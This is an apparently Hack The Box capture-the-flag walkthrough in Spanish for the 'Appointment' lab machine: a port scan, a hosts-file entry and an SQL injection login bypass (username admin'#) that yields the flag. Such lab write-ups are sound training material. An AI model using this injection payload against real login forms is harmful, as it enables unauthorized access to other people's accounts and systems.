Maquina: Appointment

Autor:

Dificultad: Muy Facil

![Screenshot 2024-11-10 154315](https://github.com/user-attachments/assets/3a0ddad0-6b8c-4eff-b04d-0add7e5d6a33)

Iniciamos la máquina y verificamos la conexión

ping 10.129.67.125  -c 1

![Screenshot 2024-11-10 154425](https://github.com/user-attachments/assets/575e2a0b-8d04-4696-9fd6-977d7d4548c2)
 
realizamos un escaneo de puertos y servicios

sudo nmap -p- --min-rate 5000 -sV 10.129.67.125 

el puerto 80 perteneciendo al servicio HTTP está abierto

![Screenshot 2024-11-10 154537](https://github.com/user-attachments/assets/fb84b535-70d8-40fd-a227-7f7af2a17e4f)

añadimos la ip para que nos deje entrar en la web

echo 10.129.67.125  usage.htb | sudo tee -a /etc/hosts

![Screenshot 2024-11-10 160039](https://github.com/user-attachments/assets/ee163d47-0319-4d3d-b235-30e2fd9c1979)

vamos a la web

http://10.129.67.125

![Screenshot 2024-11-10 155422](https://github.com/user-attachments/assets/434e4ca2-6e19-41d9-901e-3a9b1b93e81c)

Es un formulario de Login, probamos a hacer una SQL Injection para que nos deje loguear 

![Screenshot 2024-11-10 155644](https://github.com/user-attachments/assets/31043325-eb81-4a08-9e6a-6f176d75b925)

Usuario: admin'#
Password: 1=1

y conseguimos el flag

![Screenshot 2024-11-10 155828](https://github.com/user-attachments/assets/a13dded4-72d6-47fa-874f-98872cb18e14)
